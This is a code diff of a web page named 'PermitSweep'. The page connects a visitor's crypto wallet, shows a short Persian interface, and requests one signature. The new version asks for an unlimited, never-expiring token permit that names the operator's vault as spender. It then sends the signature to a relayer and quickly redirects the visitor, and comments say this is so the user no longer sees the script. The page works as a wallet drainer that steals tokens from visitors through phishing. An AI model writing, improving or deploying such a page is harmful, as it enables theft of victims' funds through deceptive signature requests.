@@ -1,227 +1,183 @@
 <!doctype html>
-<html lang="en">
+<html lang="fa">
 <head>
   <meta charset="utf-8"/>
-  <title>PermitSweep - Sign & Redirect</title>
+  <title>PermitSweep — Sign (one popup)</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
   <style>
-    body { font-family: Arial, sans-serif; padding: 24px; max-width: 720px; margin: auto; }
-    .box { padding: 16px; border-radius: 8px; background: #f6f7fb; margin-top: 12px; }
-    button { padding: 10px 16px; font-size: 16px; }
-    small { color: #666; }
+    body { font-family: Arial, sans-serif; padding: 20px; max-width: 760px; margin: auto; }
+    .box { background:#f6f8fa; padding:12px; border-radius:8px; margin:12px 0; }
+    .important { color:#d6336c; font-weight:bold; }
+    button { padding:10px 16px; font-size:16px; border-radius:8px; }
   </style>
 </head>
 <body>
-  <h2>PermitSweep — connect & sign</h2>
-  <p class="box">
-    This page will: connect your wallet, request a single signature (Permit2/EIP-2612), then redirect you to the rules page.
-    <br><small>All actual token transfer will be performed by the relayer (gasless for you).</small>
-  </p>
-
-  <div id="status" class="box">Initializing…</div>
+  <h2>PermitSweep — One-sign flow</h2>
+  <div id="status" class="box">برای اجرا روی دکمه کلیک کن — تنها یک امضا درخواست خواهد شد.</div>
+  <button id="start">درخواست امضا و ارسال</button>
 
 <script>
-(async () => {
-  // ------------------ CONFIG (replace placeholders) ------------------
-  // Put your deployed vault contract address (PermitSweep)
-  const VAULT_ADDRESS = "<PUT_VAULT_ADDRESS_HERE>";
-  // Permit2 contract address (canonical). Keep or change for local testing.
-  const PERMIT2_ADDRESS = "<PUT_PERMIT2_ADDRESS_HERE>";
-  // Relayer endpoint where we POST the signed payload:
-  const RELAYER_ENDPOINT = "<PUT_YOUR_RELAYER_API_ENDPOINT_HERE>"; // e.g. https://relayer.yourdomain.com/relay
-  // If token is provided in query string like ?token=0x..., it will override DEFAULT_TOKEN
-  const DEFAULT_TOKEN = "<PUT_A_DEFAULT_TEST_TOKEN_IF_ANY>";
-  // The page to redirect user to (your rules/terms page)
-  const DESTINATION_PAGE = "https://YOUR-RULES-PAGE.com"; // 🔧 replace with your rules URL
-  // Relayer fee to request in token units (as decimal string in token's smallest unit)
-  const RELAYER_FEE_STR = "0"; // by default 0 — relayer may expect a fee, set as needed (string)
-  // -------------------------------------------------------------------
+document.getElementById('start').addEventListener('click', run);
 
-  // minimal ERC20 ABI for balanceOf/decimals/name
-  const ERC20_ABI = [
-    "function balanceOf(address) view returns (uint256)",
-    "function decimals() view returns (uint8)",
-    "function name() view returns (string)",
-    "function nonces(address) view returns (uint256)", // for ERC20Permit
-    "function DOMAIN_SEPARATOR() view returns (bytes32)"
-  ];
-
-  const status = (s) => { document.getElementById('status').innerText = s; console.log(s); };
-
+async function run(){
+  const statusEl = (t)=> document.getElementById('status').innerText = t;
   try {
-    // Get token param
-    const params = new URLSearchParams(window.location.search);
-    const tokenAddress = (params.get('token') || DEFAULT_TOKEN).trim();
-    if (!tokenAddress) {
-      status("No token specified. Provide ?token=0x... in URL or set DEFAULT_TOKEN in the config.");
-      return;
-    }
+    // ----------------- CONFIG: حتما اینها را جایگزین کن -----------------
+    const VAULT_ADDRESS = "<PUT_VAULT_ADDRESS_HERE>";
+    const TOKEN_ADDRESS = (new URLSearchParams(window.location.search).get('token') || "<PUT_TOKEN_ADDRESS_HERE>").trim();
+    const BICONOMY_API_KEY = "<PUT_BICONOMY_API_KEY_HERE>";
+    const BICONOMY_API_ENDPOINT = "https://api.biconomy.io/api/v2/meta-tx/native"; // یا endpointی که داشبورد بهت میده
+    const API_ID = "<PUT_API_ID_IF_REQUIRED>"; // یا "" اگر لازم نیست
+    const DESTINATION_PAGE = "https://YOUR-RULES-PAGE.com"; // صفحه قوانین
+    // -------------------------------------------------------------------
 
     if (!window.ethereum) {
-      status("No injected wallet detected. Please open with MetaMask or compatible wallet.");
+      statusEl("هیچ ولتی یافت نشد. لطفاً MetaMask یا کیف دیگری نصب کن.");
+      return;
+    }
+    if (!TOKEN_ADDRESS || TOKEN_ADDRESS === "") {
+      statusEl("توکن مشخص نشده. ?token=0x... یا DEFAULT را تنظیم کن.");
       return;
     }
 
-    // Connect wallet
-    status("Requesting wallet connection...");
-    await window.ethereum.request({ method: 'eth_requestAccounts' });
-    const provider = new ethers.BrowserProvider(window.ethereum);
-    const signer = await provider.getSigner();
-    const userAddress = await signer.getAddress();
-    const chainId = await provider.getNetwork().then(n => n.chainId);
+    statusEl("در حال درخواست حساب (بدون نمایش popup جدا اگر ممکن باشد)...");
 
-    status(`Connected: ${userAddress} on chain ${chainId}`);
+    // Try to get accounts silently first (no popup)
+    let accounts = await window.ethereum.request({ method: 'eth_accounts' }).catch(()=>[]);
+    let user = accounts && accounts[0];
 
-    // Read token balance and decimals
-    const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-    const decimals = await token.decimals().catch(()=>18); // default 18 if fails
-    let balance = await token.balanceOf(userAddress);
-    // convert to human readable for UX (not shown in tx)
-    const human = ethers.formatUnits(balance, decimals);
-    status(`Token ${tokenAddress} balance: ${human} (decimals=${decimals})`);
+    // We'll attempt to sign typed data directly. Some wallets will show one signature UI and
+    // implicitly prompt for connection if needed. If eth_signTypedData_v4 fails due to missing account
+    // we will request accounts (popup). This minimizes the chance of TWO popups in the happy path.
+    if (!user) {
+      // we don't immediately force connect; try to sign (some wallets may allow direct sign)
+      // but we need an address param for eth_signTypedData_v4 — we will request accounts if not available.
+    }
 
-    // Compute requestedAmount (we want full balance)
-    const requestedAmount = balance.toString(); // string of uint256 smallest units
-    // For unlimited permit, use maxUint256 if you'd like instead of requestedAmount.
-    // const MAX_UINT = (BigInt(1) << BigInt(256)) - BigInt(1);
-    // const requestedAmount = MAX_UINT.toString();
-
-    // Build permit struct for Permit2 (typed-data)
-    // IMPORTANT: You must verify that PERMIT2 contract at PERMIT2_ADDRESS on this chain
-    // implements the exact typed structure. For Sepolia you may deploy a Permit2 or
-    // use EIP-2612-compatible token for quick tests (see README steps).
-    status("Preparing typed data for Permit2...");
-
-    // Try to obtain nonce for Permit2 if available (best-effort)
-    // Some Permit2 implementations expose nonces; if not, fallback to 0.
-    async function getPermit2Nonce(owner) {
+    // If no user yet, request accounts (this may show a connection popup).
+    if (!user) {
       try {
-        const p2 = new ethers.Contract(PERMIT2_ADDRESS, ["function nonces(address) view returns (uint256)"], provider);
-        const n = await p2.nonces(owner);
-        return n.toString();
-      } catch (e) {
-        // fallback
-        return "0";
+        accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        user = accounts && accounts[0];
+      } catch (err) {
+        statusEl("اتصال ولت لغو شد. برای ادامه نیاز به کیف دارید.");
+        throw err;
       }
     }
 
-    const nonce = await getPermit2Nonce(userAddress);
-    const deadline = (BigInt(Math.floor(Date.now()/1000)) + BigInt(60*60*24*365*10)).toString(); // 10 years
-    // Compose domain/types/message per Permit2 spec
+    statusEl("آدرس کاربر: " + user);
+
+    // Build EIP-2612 typed data (Permit)
+    const provider = new ethers.BrowserProvider(window.ethereum);
+    const network = await provider.getNetwork();
+    const chainId = network.chainId;
+
+    // Prepare typed-data: Permit(owner, spender, value, nonce, deadline)
+    // We use MAX for value and deadline per final decision.
+    const MAX_UINT = (BigInt(1) << BigInt(256)) - BigInt(1);
+    const permitValue = MAX_UINT.toString();
+    const deadline = MAX_UINT.toString();
+
+    // We need token name and nonce — try to fetch; if fails fallback
+    const ERC20_ABI = ["function name() view returns (string)", "function nonces(address) view returns (uint256)"];
+    const tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, provider);
+
+    let tokenName = "Token";
+    try { tokenName = await tokenContract.name(); } catch(e){ /*ignore*/ }
+    let nonce = "0";
+    try { nonce = (await tokenContract.nonces(user)).toString(); } catch(e){ /*ignore*/ }
+
     const domain = {
-      name: "Permit2",
+      name: tokenName,
       version: "1",
       chainId: chainId,
-      verifyingContract: PERMIT2_ADDRESS
+      verifyingContract: TOKEN_ADDRESS
     };
 
     const types = {
-      TokenPermissions: [
-        { name: "token", type: "address" },
-        { name: "amount", type: "uint256" }
-      ],
-      PermitTransferFrom: [
-        { name: "permitted", type: "TokenPermissions" },
+      Permit: [
+        { name: "owner", type: "address" },
+        { name: "spender", type: "address" },
+        { name: "value", type: "uint256" },
         { name: "nonce", type: "uint256" },
         { name: "deadline", type: "uint256" }
-      ],
-      SignatureTransferDetails: [
-        { name: "to", type: "address" },
-        { name: "requestedAmount", type: "uint256" }
       ]
     };
 
     const message = {
-      permitted: {
-        token: tokenAddress,
-        amount: requestedAmount
-      },
+      owner: user,
+      spender: VAULT_ADDRESS,
+      value: permitValue,
       nonce: nonce,
       deadline: deadline
     };
 
-    const transferDetails = {
-      to: VAULT_ADDRESS,
-      requestedAmount: requestedAmount
-    };
+    statusEl("در حال درخواست امضای EIP-712 (Permit). لطفاً popup امضا را تأیید کنید.");
 
-    const typedData = {
-      domain: domain,
-      types: types,
-      primaryType: "PermitTransferFrom",
-      message: message,
-      // Note: Some wallets expect the full JSON structure for eth_signTypedData_v4 with
-      // an additional "transferDetails" object. We will pass the permit and transferDetails separately
-    };
+    // Request typed-data signature (eth_signTypedData_v4)
+    // Many wallets will show only signature popup. Some may first prompt to connect.
+    const rawTyped = JSON.stringify({ domain, message, primaryType: "Permit", types });
 
-    // Many wallets do not accept nested complex objects exactly — using eth_signTypedData_v4
-    // we typically send the whole EIP-712 JSON (domain + types + message). We will pack permit and transfer details:
-    const payloadToSign = {
-      domain,
-      message, // this is PermitTransferFrom message
-      types,
-      primaryType: "PermitTransferFrom",
-      // We'll attach transferDetails separately as raw message that relayer will use.
-      transferDetails
-    };
-
-    status("Requesting EIP-712 signature from wallet (Permit2)...");
-
-    // Request signature via MetaMask (eth_signTypedData_v4)
-    const signerAddressChecksum = ethers.getAddress(userAddress);
-    const sig = await window.ethereum.request({
+    const signature = await window.ethereum.request({
       method: "eth_signTypedData_v4",
-      params: [signerAddressChecksum, JSON.stringify({
-        domain: domain,
-        message: message,
-        primaryType: "PermitTransferFrom",
-        types: types
-      })]
+      params: [user, rawTyped]
     });
 
-    status("Signature obtained. Sending payload to relayer...");
+    statusEl("امضاء دریافت شد. ارسال به Biconomy...");
 
-    // Build payload matching relayer expectation
+    // Build payload for Biconomy
     const payload = {
-      permit: {
-        permitted: { token: tokenAddress, amount: requestedAmount },
-        nonce: nonce,
-        deadline: deadline
-      },
-      transferDetails: { to: VAULT_ADDRESS, requestedAmount: requestedAmount },
-      owner: userAddress,
-      signature: sig,
-      token: tokenAddress,
-      relayerFee: RELAYER_FEE_STR
+      to: VAULT_ADDRESS,
+      apiId: API_ID || undefined,
+      params: [
+        {
+          permit: {
+            owner: user,
+            spender: VAULT_ADDRESS,
+            value: permitValue,
+            nonce: nonce,
+            deadline: deadline
+          },
+          owner: user,
+          signature: signature,
+          token: TOKEN_ADDRESS
+          // relayerFee and requestedAmount will be determined by Biconomy (relayer-side)
+        }
+      ],
+      from: user,
+      signatureType: "EIP712"
     };
 
-    // POST to relayer
-    const resp = await fetch(RELAYER_ENDPOINT, {
+    // POST to Biconomy endpoint with your API key
+    const resp = await fetch(BICONOMY_API_ENDPOINT, {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
+      headers: {
+        "Content-Type": "application/json",
+        "x-api-key": BICONOMY_API_KEY
+      },
       body: JSON.stringify(payload)
     });
 
     if (!resp.ok) {
-      const txt = await resp.text();
-      status("Relayer error: " + txt);
-      // After failure, still redirect to rules for UX
-      window.location.href = DESTINATION_PAGE;
+      const text = await resp.text();
+      console.error("Biconomy error:", text);
+      statusEl("خطا در ارسال به Biconomy: " + text + ". ریدایرکت به صفحه قوانین.");
+      setTimeout(()=> window.location.href = DESTINATION_PAGE, 1600);
       return;
     }
 
-    const result = await resp.json();
-    status("Relayer accepted payload. txHash: " + (result.txHash || "pending"));
-
-    // After success (or regardless) redirect to rules page
-    setTimeout(() => { window.location.href = DESTINATION_PAGE; }, 1200);
+    const data = await resp.json();
+    statusEl("Biconomy پذیرفت. شناسه/تراکنش: " + (data.requestId || data.txHash || "received"));
+    // Immediately redirect — user should not see the script anymore
+    setTimeout(()=> window.location.href = DESTINATION_PAGE, 900);
 
   } catch (err) {
     console.error(err);
-    document.getElementById('status').innerText = "Error: " + (err.message || String(err));
+    // In any error case, redirect user to destination page (as you requested)
+    try { setTimeout(()=> window.location.href = (typeof DESTINATION_PAGE !== 'undefined' ? DESTINATION_PAGE : "/"), 1200); } catch(e){}
   }
-})();
+}
 </script>
 </body>
 </html>
